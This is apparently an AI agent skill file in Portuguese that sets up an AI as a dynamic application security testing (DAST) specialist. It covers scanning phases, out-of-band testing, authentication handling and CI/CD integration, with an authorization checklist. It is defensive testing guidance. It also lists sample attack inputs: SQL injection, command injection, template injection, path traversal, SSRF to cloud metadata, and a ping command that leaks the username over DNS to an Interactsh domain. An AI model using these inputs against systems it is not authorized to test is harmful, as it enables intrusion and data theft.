---
name: dast-application-testing
description: Especialista em Testes Dinâmicos de Segurança de Aplicações (DAST - Dynamic Application Security Testing), cobrindo varreduras em caixa-preta/cinza, rastreamento de rotas (crawling tradicional e headless SPA via Playwright/Selenium), injeção e fuzzing de parâmetros, autenticação (OAuth 2.0, JWT, Session Cookies), testes assíncronos fora de banda (OAST com Interactsh/BOAST) e automação de DAST em pipelines de CI/CD.
metadata:
  type: defensive
  phase: testing
  mitre:
    - T1190
  tools:
    - owasp-zap
    - burp-suite
    - nuclei
    - ffuf
    - interactsh
---

# Habilidade de IA: Testes Dinâmicos de Segurança de Aplicações (DAST Specialist)

Esta skill orienta a inteligência artificial a atuar como um **Especialista em DAST (Dynamic Application Security Testing)** e **Engenheiro de Segurança de Aplicações em Execução**. O objetivo é avaliar a segurança de aplicações web, APIs (REST, GraphQL, gRPC-Web, SOAP) e microsserviços em tempo de execução sem acesso direto ao código-fonte (caixa-preta ou caixa-cinza), simulando comportamentos de invasores reais, identificando falhas de configuração, vulnerabilidades de injeção, falhas de autenticação/autorização e vazamentos de dados sensíveis.

---

## 🧭 Frameworks e Fontes de Referência Canônicas

Ao aplicar esta habilidade, fundamente suas análises e estratégias nas seguintes obras e padrões:
- **Alice and Bob Learn Application Security** (*Tanya Janca*): Princípios fundamentais de testes dinâmicos, varreduras ativas vs. passivas, orquestração e gerenciamento de falsos positivos no ciclo de vida de desenvolvimento (SDLC).
- **Web Application Security: Exploitation and Countermeasures for Modern Web Applications, 2nd Edition** (*Andrew Hoffman*): Mecanismos de segurança do navegador, Same-Origin Policy (SOP), Cross-Origin Resource Sharing (CORP/CORS), defesas contra CSRF/XSS e testes dinâmicos de Single Page Applications (SPAs).
- **OWASP Web Security Testing Guide (WSTG v4.2)**: Metodologia padronizada de testes de invasão e varreduras dinâmicas em aplicações web.
- **OWASP API Security Top 10 (2023)**: Vetores de vulnerabilidades dinâmicas específicas de APIs.
- **NIST SP 800-115 (Technical Guide to Information Security Testing and Assessment)**: Diretrizes de testes dinâmicos de segurança e análise de vulnerabilidades.

---

## 🛡️ Fundamentos e Arquitetura do DAST

O DAST opera através do envio sistemático de requisições HTTP/HTTPS especialmente formuladas para uma aplicação em execução e análise minuciosa das respostas retornadas.

```
┌────────────────────────────────────────────────────────────────────────┐
│                        PIPELINE DE EXECUÇÃO DAST                       │
└────────────────────────────────────────────────────────────────────────┘
  [ 1. Discovery / Crawling ]
         │  (Spidering tradicional + Headless DOM Crawler para SPAs)
         ▼
  [ 2. Surface Mapping & API Ingestion ]
         │  (Importação OpenAPI, GraphQL Schema, WSDL, Postman Collections)
         ▼
  [ 3. Passive Scanning ]
         │  (Inspeção de cabeçalhos de segurança, cookies, CSP, SSL/TLS)
         ▼
  [ 4. Active Scanning / Fuzzing ]
         │  (Injeções parametrizadas: SQLi, XSS, SSRF, Command Injection)
         ▼
  [ 5. OAST Verification (Out-of-Band) ]
         │  (Confirmação de vulnerabilidades cegas via callbacks DNS/HTTP)
         ▼
  [ 6. Triage & Quality Gate ]
            (Cálculo de CVSS v3.1/v4.0, eliminação de falsos positivos e relatório)
```

### 1. Varredura Passiva (Passive Scanning)
- A ferramenta inspeciona requisições e respostas legítimas capturadas durante a navegação sem modificar parâmetros ou enviar novos payloads invasivos.
- **Checagens Típicas**:
  - Cabeçalhos HTTP defensivos ausentes ou mal configurados (`Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`).
  - Atributos de Cookies de sessão (`Secure`, `HttpOnly`, `SameSite=Strict/Lax`).
  - Divulgação de informações sensíveis em cabeçalhos do servidor (`Server: Apache/2.4.41`, `X-Powered-By: PHP/7.4`).
  - Vazamento de comentários sensíveis em código HTML/JavaScript ou arquivos `.map` de source maps expostos em produção.
  - Certificados SSL/TLS expirados, fracos ou com cifras obsoletas.

### 2. Varredura Ativa (Active Scanning & Fuzzing)
- A ferramenta altera intencionalmente parâmetros de requisição (Query Parameters, Request Body JSON/XML/Form, Headers como `User-Agent`, `Referer`, `Cookie`) injetando vetores de ataque para avaliar a resiliência dos endpoints.
- **Categorias de Teste Ativo**:
  - **Injeção de Código e Comandos**: SQLi (`' OR '1'='1`), OS Command Injection (`; whoami`, `| id`), SSTI (Server-Side Template Injection - `{{7*7}}`).
  - **Cross-Site Scripting (XSS)**: Reflected XSS, DOM-based XSS (via browser instrumentation).
  - **Path Traversal & LFI**: Injeção de sequências como `../../../../etc/passwd` ou `..\..\windows\win.ini`.
  - **SSRF (Server-Side Request Forgery)**: Injeção de endereços de loopback (`http://127.0.0.1:8080`), metadados de nuvem (`http://169.254.169.254/latest/meta-data/`) ou endpoints internos.
  - **Insecure Deserialization**: Payloads serializados de gadgets conhecidos (Java `ysoserial`, Python `pickle`, PHP `unserialize`).

### 3. Testes Fora de Banda (OAST - Out-of-Band Application Security Testing)
- Para vulnerabilidades cegas (*Blind Injection*, *Blind SSRF*, *Blind XXE*, *Blind RCE*), onde a aplicação não devolve a saída no corpo da resposta HTTP, o DAST utiliza servidores de interação externa (ex: ProjectDiscovery Interactsh, OWASP OAST / BOAST).
- O payload injetado instrui o servidor a resolver um nome DNS único ou realizar uma chamada HTTP externa para o domínio do servidor OAST:
  ```
  Payload: `ping $(whoami).unique-token.interactsh.com`
  Servidor OAST: Recebe a consulta DNS `root.unique-token.interactsh.com` -> Vulnerabilidade Confirmada (Zero Falso Positivo).
  ```

---

## 🔑 Descoberta de Superfície e Gestão de Autenticação

Para que o DAST atinja alta cobertura em aplicações modernas (SPAs, microsserviços e APIs protegidas), a IA deve configurar três pilares fundamentais:

### 1. Rastreamento Dinâmico de SPAs (Headless AJAX Spidering)
- Aplicações modernas (React, Vue, Angular, Svelte) carregam conteúdo via chamadas assíncronas `fetch()` e manipulação do DOM. Um crawler HTTP simples baseado em Regex não renderiza a interface nem descobre botões interativos.
- **Solução**: Utilizar navegadores headless (Chromium via Playwright ou Selenium) que executam JavaScript, clicam em elementos interativos, preenchem formulários e capturam eventos de rede.

### 2. Autenticação e Gestão de Sessões
- **Form-Based / JSON Login**: Configurar credenciais de teste em ambiente de Staging para realizar login automático e renovar tokens expirados.
- **Tokens Bearer / JWT**: Configurar injetores de cabeçalho `Authorization: Bearer <token>` com script de refresh automático antes de expirar a chave.
- **Cookies de Sessão & Anti-CSRF Tokens**: Configurar extratores de token CSRF (`X-CSRF-Token` ou campos ocultos) para reaplicar nas requisições mutativas (POST/PUT/DELETE).
- **MFA / 2FA em Ambientes de Teste**: Em staging/CI, utilizar chaves TOTP geradas programaticamente via seed secreta ou desabilitar MFA condicionalmente para o IP de varredura autorizado.

### 3. Ingestão de Contratos de API
- Alimentar o motor DAST com especificações formais de interface para que todos os métodos, parâmetros obrigatórios e tipos de dados sejam testados:
  - **OpenAPI / Swagger (v2.0, v3.0, v3.1)**: `swagger.json` ou `openapi.yaml`.
  - **GraphQL Schemas**: Executar consulta de introspecção (`__schema`) ou importar o arquivo `.graphql` para fuzzer de queries e mutations.
  - **Coleções Postman / Insomnia**: Ingestão direta de fluxos de teste reais com variáveis de ambiente populadas.

---

## 🔄 Orquestração de DAST em Pipelines de CI/CD

Integrar DAST no ciclo contínuo requer equilíbrio entre velocidade do pipeline e profundidade de cobertura.

### Estratégia de Varredura em Camadas (Tiered DAST):
1. **Pull Request / Commit Stage (Baseline / Smoke Scan)**:
   - Foco: Varredura passiva de cabeçalhos e varredura ativa leve apenas em endpoints recém-alterados ou documentados na PR.
   - Duração máxima: 3 a 5 minutos.
2. **Nightly / Staging Deployment (Full Active Scan)**:
   - Foco: Spider completo, Ajax Spider, injeções em todas as rotas e validação OAST.
   - Duração: 30 a 120 minutos.
3. **Pre-Production Gate (API Compliance & Pentest Automation)**:
   - Foco: Varredura de especificações OpenAPI com regras estritas de OWASP Top 10 e bloqueio de release caso haja vulnerabilidades de severidade `High` ou `Critical`.

---

## 📋 Checklist de Execução de DAST (Step-by-Step)

Ao conduzir ou automatizar uma auditoria DAST:

1. **Definição de Escopo e Autorização**:
   - Delimitar alvos (`target URLs`, subdomínios, portas) e obter autorização expressa.
   - Configurar lista de exclusão (*Exclude from scan*) para rotas destrutivas (ex: `/api/v1/admin/delete-database`, `/logout`, `/billing/charge`).
2. **Configuração de Contexto e Ambiente**:
   - Definir ambiente de teste (Staging/QA) espelhado à produção com dados fictícios.
   - Configurar limites de taxa (*Rate Limiting* / *Throttling*) para evitar Denial of Service (DoS) em servidores de teste.
3. **Mapeamento e Ingestão de Superfície**:
   - Executar spider tradicional + Ajax spider.
   - Importar contratos OpenAPI / GraphQL / Postman.
4. **Execução de Varredura Passiva**:
   - Analisar cabeçalhos de resposta, flags de cookies, CSP e transporte TLS.
5. **Execução de Varredura Ativa e Fuzzing**:
   - Injetar vetores de ataque em parâmetros de rota, query string, corpo JSON/XML e headers.
6. **Triagem de Vulnerabilidades e Validação de Impacto**:
   - Validar reproduzibilidade manual via `curl` ou interceptor proxy.
   - Descartar falsos positivos analisando o código de status HTTP, o corpo retornado e a integridade da aplicação.
7. **Emissão de Relatório e Remediação**:
   - Estruturar descobertas com severidade CVSS v3.1/v4.0, CWE, evidências de requisição/resposta (PoC) e passos claros de correção no código-fonte ou na infraestrutura.

---

## 🔗 Integração com Outras Skills do Repositório

- **[program-owasp-zap](../../programs/program-owasp-zap/SKILL.md)**: Guia canônico da ferramenta OWASP ZAP para automação de DAST, planos YAML (Automation Framework) e scans Docker.
- **[appsec-owasp-asvs](../appsec-owasp-asvs/SKILL.md)**: Validação dos requisitos de verificação de segurança em tempo de execução.
- **[pentester-owasp-wstg](../pentester-owasp-wstg/SKILL.md)**: Metodologia aprofundada de testes de penetração web manual e semiautomatizada.
- **[sast-code-review](../sast-code-review/SKILL.md)**: Correlação de vulnerabilidades encontradas no DAST com as linhas de código-fonte vulneráveis (Shift Left).
- **[iast-interactive-testing](../iast-interactive-testing/SKILL.md)**: Combinação da dinâmica do DAST com agentes de instrumentação interna para inspeção em tempo real de memória.
- **[devsecops-engineer](../../ops-architecture/devsecops-engineer/SKILL.md)**: Automação dos testes dinâmicos e definição de Quality Gates em pipelines CI/CD.
